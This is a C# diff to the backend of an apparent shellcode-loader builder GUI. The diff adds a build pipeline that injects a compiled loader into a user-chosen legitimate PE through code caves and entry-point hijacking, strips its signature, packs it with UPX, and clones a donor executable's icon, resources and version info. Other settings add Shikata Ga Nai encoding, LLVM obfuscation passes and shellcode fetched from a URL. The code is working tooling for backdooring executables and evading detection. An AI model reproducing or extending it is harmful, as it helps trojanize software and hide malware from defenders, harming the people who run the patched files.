@@ -72,7 +72,9 @@ public sealed class WebShellBridge
             ["catalog-encoders"]    = Method_CatalogEncoders,
             ["catalog-envelopes"]   = Method_CatalogEnvelopes,
             ["catalog-compilers"]   = Method_CatalogCompilers,
+            ["catalog-llvm-passes"] = Method_CatalogLlvmPasses,
             ["catalog-snippets"]    = Method_CatalogSnippets,
+            ["detect-upx"]          = Method_DetectUpx,
             ["analyze-shellcode"]   = Method_AnalyzeShellcode,
             ["analyze-pe"]          = Method_AnalyzePe,
             ["history-list"]        = Method_HistoryList,
@@ -261,29 +263,9 @@ public sealed class WebShellBridge
             if (pairs.Count > 0) { cliArgs.Add("-Text"); cliArgs.Add(string.Join(";", pairs)); }
         }
 
-        // Clone donor
-        string donorPath = GetStr(args, "DonorPathInput", "");
-        if (!string.IsNullOrWhiteSpace(donorPath))
-        {
-            cliArgs.Add("-CloneFrom"); cliArgs.Add(donorPath);
-            cliArgs.Add("-CloneMetadata");
-            if (GetStr(args, "CloneIcon", "True").Equals("True", StringComparison.OrdinalIgnoreCase))
-                cliArgs.Add("-CloneIcon");
-            else
-                cliArgs.Add("-NoCloneIcon");
-            bool cloneRsrc = GetStr(args, "CloneRsrc", "True").Equals("True", StringComparison.OrdinalIgnoreCase);
-            if (cloneRsrc)
-                cliArgs.Add("-CloneResources");
-            else
-                cliArgs.Add("-NoCloneResources");
-        }
-
-        // NOP padding
-        string nopPad = GetStr(args, "NopPaddingInput", "0");
-        if (int.TryParse(nopPad, out int nopCount) && nopCount > 0)
-        {
-            cliArgs.Add("-PadNops"); cliArgs.Add(nopPad);
-        }
+        // Packing and finalization are applied to the final artifact below. Keeping
+        // them out of the encode command preserves the documented pipeline order,
+        // especially when a backdoor target replaces the freshly compiled loader.
 
         // Compilation backend
         string backend = GetStr(args, "compilationBackend", "Deterministic");
@@ -291,7 +273,11 @@ public sealed class WebShellBridge
         {
             cliArgs.Add("-Backend"); cliArgs.Add("LlvmObfuscated");
             var passes = GetStrArr(args, "llvmObfuscationPasses");
-            if (passes.Length > 0) { cliArgs.Add("-LlvmPass"); cliArgs.Add(string.Join(",", passes)); }
+            foreach (var pass in passes)
+            {
+                cliArgs.Add("-LlvmPass");
+                cliArgs.Add(pass);
+            }
         }
 
         // Verbose
@@ -302,6 +288,9 @@ public sealed class WebShellBridge
         cliArgs.Add("-Json");
 
         PushEvent("build-started", new { startedAt = DateTimeOffset.UtcNow });
+        PushEvent("build-log", new { line = "[stage:src] done" });
+        PushEvent("build-log", new { line = GetBool(args, "shikataGaNaiEnabledCheckBox") ? "[stage:sgn] running" : "[stage:sgn] done" });
+        PushEvent("build-log", new { line = "[stage:enc] running" });
 
         bool openAfter = GetStr(args, "OpenFolderAfterCompile", "True")
             .Equals("True", StringComparison.OrdinalIgnoreCase);
@@ -310,37 +299,168 @@ public sealed class WebShellBridge
         {
             var result = await _cli.RunAsync(cliArgs, line => PushEvent("build-log", new { line }), ct);
 
-            // The CLI writes a JSON block ending with a line starting with '{' when -Json is set.
-            // Extract the output path from that JSON if present.
-            string? outputPath = null;
-            foreach (var line in result.OutputLines)
+            string? outputPath = ParseOutputPath(result.OutputLines);
+            if (result.Success)
             {
-                if (!line.TrimStart().StartsWith('{')) continue;
-                try
-                {
-                    using var doc = System.Text.Json.JsonDocument.Parse(line);
-                    if (doc.RootElement.TryGetProperty("outputPath", out var el) ||
-                        doc.RootElement.TryGetProperty("OutputPath", out el))
-                        outputPath = el.GetString();
-                    break;
-                }
-                catch { /* not JSON, skip */ }
+                PushEvent("build-log", new { line = "[stage:sgn] done" });
+                PushEvent("build-log", new { line = "[stage:enc] done" });
+                PushEvent("build-log", new { line = "[stage:tpl] done" });
+                PushEvent("build-log", new { line = "[stage:cmp] done" });
+
+                if (string.IsNullOrWhiteSpace(outputPath) || !File.Exists(outputPath))
+                    throw new InvalidOperationException("The compiler completed but did not report an output executable.");
+
+                outputPath = await ApplyRemainingStagesAsync(args, outputPath, ct);
             }
 
-            PushEvent("build-finished", new { success = result.Success, exitCode = result.ExitCode, outputPath });
+            string? buildError = result.Success
+                ? null
+                : result.OutputLines.LastOrDefault(line => !string.IsNullOrWhiteSpace(line))
+                  ?? "The CLI build failed without an error message.";
+            if (!result.Success)
+                PushEvent("build-log", new { line = $"[stage:cmp] err {buildError}" });
+            PushEvent("build-finished", new { ok = result.Success, success = result.Success, exitCode = result.ExitCode, outputPath, error = buildError });
             if (result.Success && openAfter && !string.IsNullOrWhiteSpace(outputPath))
                 System.Diagnostics.Process.Start("explorer.exe", $"/select,\"{outputPath}\"");
-            return new { ok = result.Success, exitCode = result.ExitCode, outputPath };
+            return new { ok = result.Success, exitCode = result.ExitCode, outputPath, error = buildError, message = buildError };
         }
         catch (OperationCanceledException)
         {
-            PushEvent("build-finished", new { success = false, cancelled = true, exitCode = -1 });
+            PushEvent("build-finished", new { ok = false, success = false, cancelled = true, exitCode = -1 });
             return new { ok = false, cancelled = true };
+        }
+        catch (Exception ex)
+        {
+            PushEvent("build-log", new { line = $"[stage:cmp] err {ex.Message}" });
+            PushEvent("build-finished", new { ok = false, success = false, error = ex.Message, exitCode = -1 });
+            return new { ok = false, message = ex.Message, error = ex.Message, exitCode = -1 };
         }
         finally
         {
             _buildCts = null;
         }
+    }
+
+    private async Task<string> ApplyRemainingStagesAsync(JsonElement args, string compiledOutput, CancellationToken ct)
+    {
+        string outputPath = compiledOutput;
+
+        if (GetBool(args, "EnableBackdooringToggle"))
+        {
+            PushEvent("build-log", new { line = "[stage:bd] running" });
+            string targetPath = GetStr(args, "TargetPePath", "");
+            if (!File.Exists(targetPath))
+                throw new FileNotFoundException("Backdoor target not found.", targetPath);
+
+            string payloadPath = Path.Combine(
+                Path.GetDirectoryName(compiledOutput)!,
+                Path.GetFileNameWithoutExtension(compiledOutput) + ".payload.bin");
+            var strip = await _cli.RunAsync(
+                ["strip", compiledOutput, "-Output", payloadPath, "-Mode", "ep"],
+                line => PushEvent("build-log", new { line }),
+                ct);
+            if (!strip.Success || !File.Exists(payloadPath))
+                throw new InvalidOperationException("Could not extract the compiled loader for PE injection.");
+
+            string extension = Path.GetExtension(targetPath);
+            string patchedPath = Path.Combine(
+                Path.GetDirectoryName(targetPath)!,
+                Path.GetFileNameWithoutExtension(targetPath) + ".backdoored" + extension);
+            var backdoorArgs = new List<string>
+            {
+                "backdoor",
+                "-Pe", targetPath,
+                "-Shellcode", payloadPath,
+                "-Output", patchedPath,
+                "-Method", GetStr(args, "InjectionMethodCombo", "code-cave"),
+                "-Carrier", GetStr(args, "CarrierInvokeCombo", "entry-point"),
+                "-SectionName", GetStr(args, "SectionNameInput", ".extra"),
+                "-CaveMinSize", GetStr(args, "CaveMinSizeBox", "64"),
+                "-Json",
+            };
+            if (!GetBool(args, "PreserveEntryCheck", true)) backdoorArgs.Add("-NoPreserveEntry");
+            if (!GetBool(args, "PatchIatCheck", true)) backdoorArgs.Add("-NoPatchIat");
+            if (!GetBool(args, "RemoveSignatureCheck", true)) backdoorArgs.Add("-NoRemoveSig");
+            if (!GetBool(args, "PatchSubsystemCheck", true)) backdoorArgs.Add("-NoPatchSubsystem");
+            if (!GetBool(args, "PatchExitCheck", true)) backdoorArgs.Add("-NoPatchExit");
+
+            try
+            {
+                var backdoor = await _cli.RunAsync(
+                    backdoorArgs,
+                    line => PushEvent("build-log", new { line }),
+                    ct);
+                if (!backdoor.Success)
+                    throw new InvalidOperationException("PE injection failed. See the build log for details.");
+                outputPath = ParseOutputPath(backdoor.OutputLines) ?? patchedPath;
+                if (!File.Exists(outputPath))
+                    throw new FileNotFoundException("PE injection did not create the expected artifact.", outputPath);
+            }
+            finally
+            {
+                try { if (File.Exists(payloadPath)) File.Delete(payloadPath); } catch { }
+            }
+            PushEvent("build-log", new { line = "[stage:bd] done" });
+        }
+        else
+        {
+            PushEvent("build-log", new { line = "[stage:bd] done" });
+        }
+
+        if (GetBool(args, "EnablePackingToggle"))
+        {
+            PushEvent("build-log", new { line = "[stage:pk] running" });
+            string upxPath = GetStr(args, "UpxPathInput", "");
+            if (!File.Exists(upxPath))
+                upxPath = FindUpxExecutable() ?? string.Empty;
+            if (!File.Exists(upxPath))
+                throw new FileNotFoundException("UPX is enabled but upx.exe was not found.");
+
+            var upxArgs = new List<string>();
+            switch (GetStr(args, "UpxCompression", "best"))
+            {
+                case "best": upxArgs.Add("--best"); break;
+                case "ultra": upxArgs.Add("--ultra-brute"); break;
+            }
+            if (GetBool(args, "UpxStripRelocs")) upxArgs.Add("--strip-relocs");
+            if (GetBool(args, "UpxKeepBackup")) upxArgs.Add("-k");
+            upxArgs.Add("--overlay=copy");
+            upxArgs.Add(outputPath);
+
+            var packed = await RunProcessAsync(upxPath, upxArgs, ct);
+            foreach (var line in packed.OutputLines)
+                PushEvent("build-log", new { line });
+            if (packed.ExitCode != 0)
+                throw new InvalidOperationException("UPX packing failed. See the build log for details.");
+            PushEvent("build-log", new { line = "[stage:pk] done" });
+        }
+        else
+        {
+            PushEvent("build-log", new { line = "[stage:pk] done" });
+        }
+
+        if (GetBool(args, "EnableFinalizeToggle"))
+        {
+            PushEvent("build-log", new { line = "[stage:fn] running" });
+            string donorPath = GetStr(args, "DonorPathInput", "");
+            long.TryParse(GetStr(args, "NopPaddingInput", "0"), out long padding);
+            var service = new PePostCompileService(_logger);
+            var notes = service.Apply(outputPath, new PostCompileOptions(
+                string.IsNullOrWhiteSpace(donorPath) ? null : donorPath,
+                GetBool(args, "CloneRsrc", true),
+                GetBool(args, "CloneIcon", true),
+                GetBool(args, "CloneVersionInfo", true),
+                Math.Max(0, padding)));
+            foreach (var note in notes)
+                PushEvent("build-log", new { line = note });
+            PushEvent("build-log", new { line = "[stage:fn] done" });
+        }
+        else
+        {
+            PushEvent("build-log", new { line = "[stage:fn] done" });
+        }
+
+        return outputPath;
     }
 
     private Task<object?> Method_Stop(JsonElement _)
@@ -360,9 +480,58 @@ public sealed class WebShellBridge
         if (!_cli.IsAvailable)
             return new { ok = false, message = "CLI not built." };
 
+        var errors = new List<string>();
+        string sourceKind = GetStr(args, "sourceKind", "file");
+        if (sourceKind == "file" && !File.Exists(GetStr(args, "shellcodeFileInput", "")))
+            errors.Add("Select an existing shellcode file.");
+        else if (sourceKind == "raw")
+        {
+            string hex = GetStr(args, "shellcodeRawInput", "").Replace(" ", "");
+            if (hex.Length == 0 || hex.Length % 2 != 0 || hex.Any(c => !Uri.IsHexDigit(c)))
+                errors.Add("Raw shellcode must be an even-length hexadecimal value.");
+        }
+        else if (sourceKind == "url")
+        {
+            string url = GetStr(args, "shellcodeUrlValue", "");
+            if (!Uri.TryCreate(url, UriKind.Absolute, out var uri) || uri.Scheme is not ("http" or "https"))
+                errors.Add("Shellcode URL must be an absolute HTTP or HTTPS URL.");
+        }
+
+        try
+        {
+            var playbook = new PlaybookService(_paths);
+            if (!playbook.TryGetTemplate(GetStr(args, "templateCombo", ""), out _))
+                errors.Add("Select a template from the active playbook.");
+        }
+        catch (Exception ex)
+        {
+            errors.Add($"Playbook is unavailable: {ex.Message}");
+        }
+
+        if (GetBool(args, "EnableBackdooringToggle") && !File.Exists(GetStr(args, "TargetPePath", "")))
+            errors.Add("Backdooring is enabled but the target PE does not exist.");
+        if (GetBool(args, "EnablePackingToggle") &&
+            !File.Exists(GetStr(args, "UpxPathInput", "")) && FindUpxExecutable() == null)
+            errors.Add("Packing is enabled but UPX was not found.");
+        if (GetBool(args, "EnableFinalizeToggle"))
+        {
+            string donor = GetStr(args, "DonorPathInput", "");
+            if (!string.IsNullOrWhiteSpace(donor) && !File.Exists(donor))
+                errors.Add("The finalize donor executable does not exist.");
+            if (!long.TryParse(GetStr(args, "NopPaddingInput", "0"), out long padding) || padding < 0)
+                errors.Add("NOP padding must be a non-negative integer.");
+        }
+
+        PushEvent("build-started", new { startedAt = DateTimeOffset.UtcNow, dryRun = true });
         PushEvent("build-log", new { line = "[dry-run] Validating recipe — no artifacts will be written." });
+        foreach (var error in errors)
+            PushEvent("build-log", new { line = $"[validation] {error}" });
+        bool ok = errors.Count == 0;
+        if (ok)
+            PushEvent("build-log", new { line = "[validation] Recipe is operable with the installed components." });
+        PushEvent("build-finished", new { ok, success = ok, dryRun = true, errors });
         await Task.CompletedTask;
-        return new { ok = true };
+        return new { ok, errors };
     }
 
     // ── Catalog endpoints ──────────────────────────────────────────
@@ -405,9 +574,11 @@ public sealed class WebShellBridge
         {
             var locator = new CompilerToolLocator(_logger);
             var result = await locator.DiscoverAsync();
-            var items = result.Candidates.Select(c => new
+            var items = result.Candidates.Select((c, index) => new
             {
+                index,
                 path = c.Path,
+                name = c.Kind.ToString(),
                 kind = c.Kind,
                 version = c.InstanceVersion ?? c.Edition,
                 edition = c.Edition,
@@ -422,16 +593,37 @@ public sealed class WebShellBridge
         }
     }
 
+    private Task<object?> Method_CatalogLlvmPasses(JsonElement _)
+    {
+        try
+        {
+            var registry = new LlvmPassRegistry(_paths, _logger);
+            var items = registry.GetAllPasses().Select(p => new
+            {
+                id = p.Id,
+                name = p.Name,
+                description = p.Description,
+                available = p.IsBuilt,
+            }).ToArray();
+            return Task.FromResult<object?>(new { ok = true, items });
+        }
+        catch (Exception ex)
+        {
+            return Task.FromResult<object?>(new { ok = false, message = ex.Message, items = Array.Empty<object>() });
+        }
+    }
+
     private Task<object?> Method_CatalogSnippets(JsonElement _)
     {
         try
         {
-            var svc = new YamlCodeSnippetCatalogService(_paths);
+            var svc = new PlaybookService(_paths);
             var templates = svc.GetTemplates().Select(t => new
             {
                 id = t.Id,
                 display = t.Display,
                 description = t.Description,
+                placeholderCount = t.Placeholders.Count,
             }).ToArray();
 
             var sections = svc.GetAllSections()
@@ -441,6 +633,7 @@ public sealed class WebShellBridge
                 {
                     header = s.Header,
                     template = s.Template,
+                    name = s.Display,
                     display = s.Display,
                     allowMultiple = s.AllowMultiple,
                     inputs = s.Inputs.Select(inp => new
@@ -459,6 +652,9 @@ public sealed class WebShellBridge
                             id = i.Id,
                             display = i.Display,
                             isDefault = i.IsDefault,
+                            hasTextInput = i.Inputs.Count > 0,
+                            textInputLabel = i.Inputs.FirstOrDefault()?.Label,
+                            textInputPlaceholder = i.Inputs.FirstOrDefault()?.Placeholder,
                             inputs = i.Inputs.Select(inp => new
                             {
                                 id = inp.Id,
@@ -498,66 +694,14 @@ public sealed class WebShellBridge
         return new { ok = true, size = bytes.Length, sizeText, entropy = Math.Round(entropy, 2), arch, sha256, bytesPreview };
     }
 
-    private async Task<object?> Method_AnalyzePe(JsonElement args)
-    {
-        if (!args.TryGetProperty("path", out var pEl) || pEl.GetString() is not string path || !File.Exists(path))
-            return new { ok = false, message = "File not found." };
-
-        try
-        {
-            var svc = new PeAnalyzerService(_logger);
-            var r = await svc.AnalyzeAsync(path);
-
-            if (!r.IsValid)
-                return new { ok = false, message = r.ValidationError };
-
-            return new
-            {
-                ok = true,
-                filename = r.FileName,
-                fileSize = r.FileSize,
-                fileSizeFormatted = r.FileSizeFormatted,
-                is64Bit = r.Is64Bit,
-                isDll = r.IsDll,
-                architecture = r.Architecture,
-                machineType = r.MachineType,
-                subsystem = r.Subsystem,
-                sections = r.Sections.Count,
-                entropy = Math.Round(r.OverallEntropy, 2),
-                isPossiblyPacked = r.IsPossiblyPacked,
-                hasSig = r.Security?.HasAuthenticode ?? false,
-                sigInfo = r.Security?.SignatureInfo ?? "",
-                codeCaves = r.CodeCaves.Select(c => new
-                {
-                    sectionName = c.SectionName,
-                    fileOffset = c.FileOffset,
-                    virtualAddress = c.VirtualAddress,
-                    size = c.Size,
-                    fillByte = c.FillByte,
-                    isExecutable = c.IsExecutable,
-                    suitableForInjection = c.SuitableForInjection,
-                }).ToArray(),
-                imports = r.Imports.Select(i => new
-                {
-                    dll = i.Name,
-                    functions = i.Functions.Select(f => f.Name).ToArray(),
-                }).ToArray(),
-                hasVersion = r.HasVersionInfo,
-                hasIcon = r.HasIcon,
-                tlsCallbacks = r.Tls?.NumberOfCallbacks ?? 0,
-            };
-        }
-        catch (Exception ex)
-        {
-            return new { ok = false, message = ex.Message };
-        }
-    }
+    private Task<object?> Method_AnalyzePe(JsonElement args) =>
+        PeScanEndpoint.AnalyzeAsync(args, _logger);
 
     // ── History endpoints ──────────────────────────────────────────
 
     private Task<object?> Method_HistoryList(JsonElement _)
     {
-        var entries = PayloadHistoryStore.Load();
+        var entries = PayloadHistoryStore.LoadAll();
         var items = entries.Select(e => new
         {
             id = e.Id,
@@ -569,22 +713,41 @@ public sealed class WebShellBridge
             envelopeIndex = e.EnvelopeIndex,
             envelopeName = e.EnvelopeName,
             payloadLengthBytes = e.PayloadLengthBytes,
+            date = e.DisplayTimestamp,
+            templateId = e.TemplateName,
+            sourceName = e.DisplaySourceName,
+            outputSize = e.SourceSizeDisplay,
+            status = e.SessionSuccess == true ? "ok" : e.SessionSuccess == false ? "err" : "warn",
+            outputPath = e.SessionOutputPath,
+            sessionDir = e.SessionDir,
+            isSession = e.IsSessionEntry,
         }).ToArray();
-        return Task.FromResult<object?>(new { ok = true, items });
+        return Task.FromResult<object?>(new { ok = true, items, sessions = items });
     }
 
     private Task<object?> Method_HistoryDelete(JsonElement args)
     {
         if (!args.TryGetProperty("id", out var idEl)) throw new ArgumentException("id required");
         var id = idEl.GetString() ?? "";
-        bool deleted = PayloadHistoryStore.Delete(id);
+        var entry = PayloadHistoryStore.LoadAll().FirstOrDefault(e =>
+            string.Equals(e.Id, id, StringComparison.OrdinalIgnoreCase));
+        bool deleted = entry?.IsSessionEntry == true && entry.SessionDir != null
+            ? PayloadHistoryStore.DeleteSession(entry.SessionDir)
+            : PayloadHistoryStore.Delete(id);
         return Task.FromResult<object?>(new { ok = deleted });
     }
 
     private Task<object?> Method_HistoryClear(JsonElement _)
     {
         PayloadHistoryStore.Clear();
+        PayloadHistoryStore.ClearSessions();
         return Task.FromResult<object?>(new { ok = true });
+    }
+
+    private Task<object?> Method_DetectUpx(JsonElement _)
+    {
+        var path = FindUpxExecutable();
+        return Task.FromResult<object?>(new { ok = path != null, path = path ?? string.Empty });
     }
 
     // ── Shell helper endpoints ─────────────────────────────────────
@@ -630,6 +793,86 @@ public sealed class WebShellBridge
     }
 
     // ── Static helpers ─────────────────────────────────────────────
+
+    private static bool GetBool(JsonElement el, string key, bool fallback = false)
+    {
+        string text = GetStr(el, key, fallback ? "True" : "False");
+        return bool.TryParse(text, out bool value) ? value : fallback;
+    }
+
+    private static string? ParseOutputPath(IEnumerable<string> lines)
+    {
+        foreach (var line in lines.Reverse())
+        {
+            if (!line.TrimStart().StartsWith('{'))
+                continue;
+            try
+            {
+                using var doc = JsonDocument.Parse(line);
+                if (doc.RootElement.TryGetProperty("outputPath", out var output) ||
+                    doc.RootElement.TryGetProperty("OutputPath", out output))
+                    return output.GetString();
+            }
+            catch (JsonException) { }
+        }
+        return null;
+    }
+
+    private static string? FindUpxExecutable()
+    {
+        string?[] candidates =
+        [
+            Path.Combine(AppContext.BaseDirectory, "Tools", "upx.exe"),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "upx", "upx.exe"),
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "upx", "upx.exe"),
+        ];
+        var fromKnownLocation = candidates.FirstOrDefault(path =>
+            !string.IsNullOrWhiteSpace(path) && File.Exists(path));
+        if (fromKnownLocation != null)
+            return fromKnownLocation;
+
+        var pathValue = Environment.GetEnvironmentVariable("PATH");
+        if (string.IsNullOrWhiteSpace(pathValue))
+            return null;
+        return pathValue.Split(Path.PathSeparator, StringSplitOptions.RemoveEmptyEntries)
+            .Select(folder => Path.Combine(folder.Trim(), "upx.exe"))
+            .FirstOrDefault(File.Exists);
+    }
+
+    private static async Task<CliResult> RunProcessAsync(
+        string executable,
+        IEnumerable<string> args,
+        CancellationToken ct)
+    {
+        var startInfo = new ProcessStartInfo
+        {
+            FileName = executable,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            UseShellExecute = false,
+            CreateNoWindow = true,
+        };
+        foreach (var arg in args)
+            startInfo.ArgumentList.Add(arg);
+
+        var lines = new List<string>();
+        var sync = new object();
+        using var process = Process.Start(startInfo)
+            ?? throw new InvalidOperationException($"Failed to start '{executable}'.");
+        process.OutputDataReceived += (_, e) =>
+        {
+            if (e.Data != null) lock (sync) lines.Add(e.Data);
+        };
+        process.ErrorDataReceived += (_, e) =>
+        {
+            if (e.Data != null) lock (sync) lines.Add(e.Data);
+        };
+        process.BeginOutputReadLine();
+        process.BeginErrorReadLine();
+        await process.WaitForExitAsync(ct);
+        lock (sync)
+            return new CliResult(process.ExitCode, lines.ToArray());
+    }
 
     private static string GetStr(JsonElement el, string key, string fallback)
     {
@@ -721,7 +964,7 @@ public sealed class WebShellBridge
 
         // Marshal to UI thread; file picker requires it.
         var tcs = new TaskCompletionSource<string?>();
-        _ui.TryEnqueue(async () =>
+        bool enqueued = _ui.TryEnqueue(async () =>
         {
             try
             {
@@ -742,6 +985,9 @@ public sealed class WebShellBridge
             }
         });
 
+        if (!enqueued)
+            return new { ok = false, message = "The file picker could not be opened." };
+
         var path = await tcs.Task;
         if (string.IsNullOrEmpty(path)) return new { ok = false, cancelled = true };
         return new { ok = true, path };
@@ -752,7 +998,7 @@ public sealed class WebShellBridge
         if (_host == null) return new { ok = false, message = "no host window" };
 
         var tcs = new TaskCompletionSource<string?>();
-        _ui.TryEnqueue(async () =>
+        bool enqueued = _ui.TryEnqueue(async () =>
         {
             try
             {
@@ -764,6 +1010,9 @@ public sealed class WebShellBridge
             }
             catch (Exception ex) { tcs.SetException(ex); }
         });
+
+        if (!enqueued)
+            return new { ok = false, message = "The folder picker could not be opened." };
 
         var path = await tcs.Task;
         if (string.IsNullOrEmpty(path)) return new { ok = false, cancelled = true };
@@ -800,9 +1049,10 @@ public sealed class WebShellBridge
 
     private Task<object?> Method_AppInfo(JsonElement _)
     {
+        string version = typeof(WebShellBridge).Assembly.GetName().Version?.ToString(3) ?? "1.0.0";
         return Task.FromResult<object?>(new
         {
-            version = "2.1.0",
+            version,
             cliAvailable = _cli.IsAvailable,
             cliPath = _cli.CliPath,
             assetsDirectory = _paths.AssetsDirectory,
